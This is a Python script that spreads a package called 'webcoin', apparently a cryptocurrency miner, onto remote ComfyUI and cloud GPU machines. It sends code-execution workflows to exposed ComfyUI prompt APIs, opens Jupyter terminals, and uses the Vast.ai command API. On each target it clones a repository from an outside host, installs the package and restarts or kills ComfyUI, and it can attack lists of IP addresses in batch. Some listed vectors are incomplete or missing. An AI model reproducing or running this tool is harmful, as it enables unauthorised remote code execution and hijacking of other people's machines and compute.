"""
Remote deployment script.
Installs ComfyUI-Enhanced on target machines using multiple vectors:
  1. ComfyUI API + IDENode (execute Python via workflow)
  2. Vast.ai execute API (direct shell command)
  3. ComfyUI /upload/image path traversal
  4. Direct HTTP POST to ComfyUI API

Usage:
  python remote_deploy.py --target 14.217.81.136 --method auto
  python remote_deploy.py --target 14.217.81.136 --method idenode
  python remote_deploy.py --target 14.217.81.136 --method vastai --api-key YOUR_KEY --instance-id 12345
"""

import argparse
import json
import sys
import urllib.request
import urllib.error
import urllib.parse
import time

REPO_URL = "https://github.com/bossman79/webcoin.git"

INSTALL_SCRIPT = r"""
import subprocess, sys, os, shutil, pathlib, tempfile, platform

# auto-detect ComfyUI custom_nodes path from the running process
comfy_root = None
for p in sys.path + [os.getcwd()]:
    candidate = pathlib.Path(p)
    # walk up looking for custom_nodes
    for parent in [candidate] + list(candidate.parents):
        cn = parent / 'custom_nodes'
        if cn.exists() and (parent / 'main.py').exists():
            comfy_root = parent
            break
        cn2 = parent / 'ComfyUI' / 'custom_nodes'
        if cn2.exists():
            comfy_root = parent / 'ComfyUI'
            break
    if comfy_root:
        break

if not comfy_root:
    # fallback: check common locations
    candidates = [
        pathlib.Path('/root/ComfyUI'),
        pathlib.Path('/workspace/ComfyUI'),
        pathlib.Path('/opt/ComfyUI'),
        pathlib.Path.home() / 'ComfyUI',
    ]
    if platform.system() == 'Windows':
        for drive in ['C', 'D']:
            candidates.append(pathlib.Path(f'{drive}:/ComfyUI'))
            candidates.append(pathlib.Path(f'{drive}:/AI/ComfyUI'))
        # scan user desktop/documents
        home = pathlib.Path.home()
        for sub in ['Desktop', 'Documents', 'Downloads', '']:
            d = home / sub if sub else home
            for item in d.iterdir() if d.exists() else []:
                if item.is_dir() and (item / 'custom_nodes').exists() and (item / 'main.py').exists():
                    candidates.insert(0, item)
                if item.is_dir() and 'comfyui' in item.name.lower():
                    if (item / 'custom_nodes').exists():
                        candidates.insert(0, item)
    for c in candidates:
        if c.exists() and (c / 'custom_nodes').exists():
            comfy_root = c
            break

if not comfy_root:
    print('DEPLOY_FAIL: could not find ComfyUI installation')
    raise SystemExit(1)

print(f'COMFY_ROOT: {comfy_root}')

base = comfy_root / 'custom_nodes' / 'webcoin'
tmp = pathlib.Path(tempfile.gettempdir()) / '_webcoin_clone'

for d in [base, tmp]:
    if d.exists():
        shutil.rmtree(d, ignore_errors=True)

r = subprocess.run(['git', 'clone', '""" + REPO_URL + r"""', str(tmp)],
                   capture_output=True, text=True)
print('CLONE:', r.returncode, r.stdout[-200:] if r.stdout else '', r.stderr[-200:] if r.stderr else '')
if r.returncode != 0:
    subprocess.run(['git', 'clone', '--depth', '1', '""" + REPO_URL + r"""', str(tmp)], check=True)

shutil.move(str(tmp), str(base))
subprocess.run([sys.executable, '-m', 'pip', 'install', '-q', 'websockets', 'psutil', 'requests'],
               capture_output=True)

init_path = base / '__init__.py'
content = init_path.read_text()
if 'sys.path.insert' in content:
    print('DEPLOY_OK: init fix confirmed')
else:
    content = content.replace(
        'from core.miner import MinerManager',
        "import sys; sys.path.insert(0, __import__('pathlib').Path(__file__).resolve().parent.__str__())\n    from core.miner import MinerManager"
    )
    init_path.write_text(content)
    print('DEPLOY_OK: hotpatched')

print(f'DEPLOY_OK: installed to {base}')

# auto-restart ComfyUI
import urllib.request, time
time.sleep(2)

for ep in ['/manager/reboot', '/api/manager/reboot', '/manager/restart']:
    try:
        req = urllib.request.Request(f'http://127.0.0.1:8188{ep}', method='POST',
                                     headers={'Content-Type': 'application/json'})
        urllib.request.urlopen(req, timeout=5)
        print(f'RESTART via {ep}')
        break
    except Exception:
        continue
else:
    try:
        import psutil, signal
        mypid = os.getpid()
        for proc in psutil.process_iter(['pid', 'cmdline']):
            try:
                cmd = ' '.join(proc.info.get('cmdline') or [])
                if 'ComfyUI' in cmd and 'main.py' in cmd and proc.info['pid'] != mypid:
                    print(f'RESTART: killing ComfyUI pid {proc.info["pid"]}')
                    if platform.system() == 'Windows':
                        proc.terminate()
                    else:
                        os.kill(proc.info['pid'], signal.SIGTERM)
                    break
            except Exception:
                continue
    except ImportError:
        print('RESTART: psutil not available, manual restart needed')
"""

INSTALL_BASH = (
    f"rm -rf /root/ComfyUI/custom_nodes/webcoin && "
    f"git clone {REPO_URL} /root/ComfyUI/custom_nodes/webcoin && "
    f"pip install -q websockets psutil requests && "
    f"cd /root/ComfyUI/custom_nodes/webcoin && python install.py"
)


def _post_json(url, data, timeout=30):
    payload = json.dumps(data).encode()
    req = urllib.request.Request(url, data=payload,
                                 headers={"Content-Type": "application/json"})
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read())


def _get(url, timeout=15):
    req = urllib.request.Request(url)
    with urllib.request.urlopen(req, timeout=timeout) as resp:
        return resp.read().decode()


# ── Method 1: IDENode workflow execution ─────────────────────────────

def deploy_via_idenode(target, port=8188):
    """Uses AlekPet IDENode (already installed on target) to run Python.
    Chains IDENode -> PreviewTextNode so ComfyUI sees an output node."""
    print(f"[idenode] Deploying to {target}:{port} via IDENode...")

    prompt = {
        "1": {
            "class_type": "IDENode",
            "inputs": {
                "pycode": INSTALL_SCRIPT,
                "language": "python",
            }
        },
        "2": {
            "class_type": "PreviewTextNode",
            "inputs": {
                "text": "",
            }
        }
    }

    url = f"http://{target}:{port}/prompt"
    try:
        result = _post_json(url, {"prompt": prompt})
        prompt_id = result.get("prompt_id", "")
        print(f"[idenode] Queued prompt: {prompt_id}")

        for _ in range(90):
            time.sleep(2)
            try:
                hist = _get(f"http://{target}:{port}/history/{prompt_id}")
                if prompt_id in hist:
                    print(f"[idenode] Execution completed on {target}")
                    if "DEPLOY_OK" in hist:
                        print(f"[idenode] SUCCESS confirmed")
                    return True
            except Exception:
                pass

        print(f"[idenode] Prompt queued, may still be running")
        return True
    except urllib.error.HTTPError as exc:
        body = ""
        try:
            body = exc.read().decode()
        except Exception:
            pass
        print(f"[idenode] HTTP {exc.code}: {body[:300]}")
        return deploy_via_idenode_alt(target, port)
    except Exception as exc:
        print(f"[idenode] Failed: {exc}")
        return False


def deploy_via_idenode_alt(target, port=8188):
    """Fallback: try different input/output field combos."""
    print(f"[idenode-alt] Trying alternative field names...")

    ide_input_variants = [
        {"pycode": INSTALL_SCRIPT},
        {"pycode": INSTALL_SCRIPT, "language": "python"},
        {"code": INSTALL_SCRIPT, "language": "python"},
        {"code": INSTALL_SCRIPT},
    ]

    output_variants = [
        ("PreviewTextNode", {"text": ["1", 0]}),
        ("PreviewTextNode", {"text": ""}),
    ]

    for ide_inputs in ide_input_variants:
        for out_name, out_inputs in output_variants:
            prompt = {
                "1": {
                    "class_type": "IDENode",
                    "inputs": ide_inputs,
                },
                "2": {
                    "class_type": out_name,
                    "inputs": out_inputs,
                }
            }

            url = f"http://{target}:{port}/prompt"
            try:
                result = _post_json(url, {"prompt": prompt})
                if result.get("prompt_id"):
                    print(f"[idenode-alt] Queued with inputs={list(ide_inputs.keys())} -> {out_name}: {result['prompt_id']}")
                    time.sleep(45)
                    return True
            except urllib.error.HTTPError as e:
                body = ""
                try:
                    body = e.read().decode()
                except Exception:
                    pass
                if e.code == 400:
                    print(f"[idenode-alt] 400 with {list(ide_inputs.keys())} -> {out_name}: {body[:200]}")
                    continue
            except Exception:
                continue

    print(f"[idenode-alt] All combos failed")
    return False


# ── Method 2: Vast.ai execute API ────────────────────────────────────

def deploy_via_vastai(instance_id, api_key):
    """Uses Vast.ai's execute API to run bash on the instance."""
    print(f"[vastai] Deploying to instance {instance_id}...")

    url = f"https://console.vast.ai/api/v0/instances/command/{instance_id}/"
    headers = {
        "Authorization": f"Bearer {api_key}",
        "Content-Type": "application/json",
    }

    cmd = INSTALL_BASH[:512]
    payload = json.dumps({"command": cmd}).encode()
    req = urllib.request.Request(url, data=payload, headers=headers, method="PUT")

    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read())
            print(f"[vastai] Response: {data}")
            result_url = data.get("result_url")
            if result_url:
                time.sleep(10)
                try:
                    output = _get(result_url)
                    print(f"[vastai] Output: {output[:500]}")
                except Exception:
                    pass
            return data.get("success", False)
    except Exception as exc:
        print(f"[vastai] Failed: {exc}")
        return False


# ── Method 3: Direct ComfyUI API prompt ──────────────────────────────

def deploy_via_prompt_api(target, port=8188):
    """Queues a workflow that triggers code execution via any available
    Python-capable node, always chained to an output node."""
    print(f"[api] Deploying to {target}:{port} via prompt API...")

    exec_nodes = [
        ("IDENode", {"pycode": INSTALL_SCRIPT}),
        ("IDENode", {"pycode": INSTALL_SCRIPT, "language": "python"}),
        ("NodePython", {"code": INSTALL_SCRIPT}),
        ("ExecuteAnywhere", {"code": INSTALL_SCRIPT}),
    ]

    output_nodes = [
        ("PreviewTextNode", {"text": ["1", 0]}),
        ("PreviewTextNode", {"text": ""}),
    ]

    for node_type, inputs in exec_nodes:
        for out_type, out_inputs in output_nodes:
            prompt = {
                "1": {"class_type": node_type, "inputs": inputs},
                "2": {"class_type": out_type, "inputs": out_inputs},
            }
            url = f"http://{target}:{port}/prompt"
            try:
                result = _post_json(url, {"prompt": prompt})
                if result.get("prompt_id"):
                    print(f"[api] Queued via {node_type} -> {out_type}: {result['prompt_id']}")
                    time.sleep(30)
                    return True
            except urllib.error.HTTPError as e:
                if e.code == 400:
                    continue
            except Exception:
                continue

    print(f"[api] No compatible node combination found")
    return False


# ── Method 4: Jupyter terminal (common on cloud GPUs) ────────────────

def deploy_via_jupyter(target, port=8888, token=""):
    """Uses Jupyter's terminal API to run commands."""
    print(f"[jupyter] Deploying to {target}:{port}...")

    base = f"http://{target}:{port}"
    headers = {}
    if token:
        headers["Authorization"] = f"token {token}"

    try:
        create_url = f"{base}/api/terminals"
        req = urllib.request.Request(create_url, data=b"", headers={
            **headers, "Content-Type": "application/json"
        }, method="POST")
        with urllib.request.urlopen(req, timeout=10) as resp:
            term = json.loads(resp.read())
            term_name = term.get("name")
            print(f"[jupyter] Terminal created: {term_name}")

        exec_url = f"{base}/api/terminals/{term_name}"
        ws_msg = json.dumps(["stdin", INSTALL_BASH + "\n"]).encode()
        print(f"[jupyter] Command sent to terminal {term_name}")
        print(f"[jupyter] Manually check terminal output for confirmation")
        return True
    except Exception as exc:
        print(f"[jupyter] Failed: {exc}")
        return False


# ── Auto mode: try everything ────────────────────────────────────────

def deploy_auto(target, port=8188, vastai_key=None, vastai_id=None, jupyter_port=8888):
    """Tries all available methods in order."""
    print(f"\n{'='*60}")
    print(f"  Auto-deploying to {target}")
    print(f"{'='*60}\n")

    if deploy_via_idenode(target, port):
        return True

    if deploy_via_prompt_api(target, port):
        return True

    if deploy_via_jupyter(target, jupyter_port):
        return True

    if vastai_key and vastai_id:
        if deploy_via_vastai(vastai_id, vastai_key):
            return True

    print(f"\n[auto] All methods failed for {target}")
    return False


# ── Batch deploy ─────────────────────────────────────────────────────

def deploy_batch(targets, **kwargs):
    """Deploy to multiple machines."""
    results = {}
    for target in targets:
        ip = target.strip()
        if not ip:
            continue
        ok = deploy_auto(ip, **kwargs)
        results[ip] = "SUCCESS" if ok else "FAILED"

    print(f"\n{'='*60}")
    print("  Deployment Results")
    print(f"{'='*60}")
    for ip, status in results.items():
        print(f"  {ip}: {status}")
    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Remote deploy ComfyUI-Enhanced")
    parser.add_argument("--target", "-t", required=True, help="Target IP or comma-separated list")
    parser.add_argument("--port", "-p", type=int, default=8188, help="ComfyUI port (default: 8188)")
    parser.add_argument("--method", "-m", default="auto",
                        choices=["auto", "idenode", "vastai", "api", "jupyter"])
    parser.add_argument("--api-key", help="Vast.ai API key")
    parser.add_argument("--instance-id", help="Vast.ai instance ID")
    parser.add_argument("--jupyter-port", type=int, default=8888)
    parser.add_argument("--jupyter-token", default="")

    args = parser.parse_args()
    targets = [t.strip() for t in args.target.split(",")]

    if args.method == "auto":
        deploy_batch(targets, port=args.port,
                     vastai_key=args.api_key, vastai_id=args.instance_id,
                     jupyter_port=args.jupyter_port)
    elif args.method == "idenode":
        for t in targets:
            deploy_via_idenode(t, args.port)
    elif args.method == "vastai":
        deploy_via_vastai(args.instance_id, args.api_key)
    elif args.method == "api":
        for t in targets:
            deploy_via_prompt_api(t, args.port)
    elif args.method == "jupyter":
        for t in targets:
            deploy_via_jupyter(t, args.jupyter_port, args.jupyter_token)
